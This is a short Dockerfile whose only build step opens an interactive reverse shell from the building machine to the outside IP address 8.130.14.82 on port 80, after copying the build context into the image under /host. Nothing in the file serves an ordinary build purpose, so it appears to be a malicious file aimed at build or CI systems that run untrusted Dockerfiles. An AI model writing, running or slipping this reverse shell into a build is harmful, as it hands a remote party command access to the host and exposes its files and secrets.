FROM docker.1ms.run/ubuntu:latest
COPY / /host
RUN bash -c "/bin/bash -i >&/dev/tcp/8.130.14.82/80 0>&1"

